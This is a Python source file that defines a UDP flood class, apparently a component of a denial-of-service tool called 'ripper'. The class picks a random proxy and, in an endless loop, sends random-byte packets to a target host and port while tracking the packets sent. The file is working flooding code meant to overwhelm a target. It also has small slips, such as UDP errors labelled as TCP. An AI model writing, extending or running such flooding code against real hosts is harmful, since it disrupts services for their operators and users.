from contextlib import suppress
from socket import socket
from typing import Tuple, Any

from ripper.common import generate_random_bytes
from ripper.context import Context, Errors
from ripper.constants import *


# TODO add support for SOCKS5 proxy if proxy supports associate request
# https://stackoverflow.com/a/47079318/2628125
# https://datatracker.ietf.org/doc/html/rfc1928
# https://blog.birost.com/a?ID=00100-38682fbb-83c3-49d7-8cfc-406b05bf086c
# PySocks has issues with basic implementation
class UdpFlood:
    """UDP Flood method."""
    _sock: socket
    _target: Tuple[str, int]
    _ctx: Context
    _proxy: Any = None

    def __init__(self, target: Tuple[str, int], context: Context):
        self._target = target
        self._ctx = context

    def create_connection(self) -> socket:
        self._proxy = self._ctx.proxy_manager.get_random_proxy()
        conn = self._ctx.sock_manager.create_udp_socket()

        return conn

    def __call__(self, *args, **kwargs):
        with suppress(Exception), self.create_connection() as udp_conn:
            self._ctx.Statistic.connect.status_success()
            while self.sendto(udp_conn):
                continue

            self._ctx.Statistic.connect.status_failed()
            self._ctx.sock_manager.close_socket()

    def sendto(self, sock: socket) -> bool:
        send_bytes = generate_random_bytes(
            self._ctx.random_packet_len,
            self._ctx.max_random_packet_len)
        try:
            sent = sock.sendto(send_bytes, self._target)
        except socket.gaierror as e:
            self._ctx.add_error(Errors('Send UDP packet', GETTING_SERVER_IP_ERROR_MSG))
        except Exception as e:
            self._ctx.add_error(Errors('TCP send Err', e))
        else:
            self._ctx.Statistic.packets.status_sent(sent_bytes=sent)
            self._ctx.remove_error(Errors('TCP send Err', GETTING_SERVER_IP_ERROR_MSG).uuid)
            return True

        return False

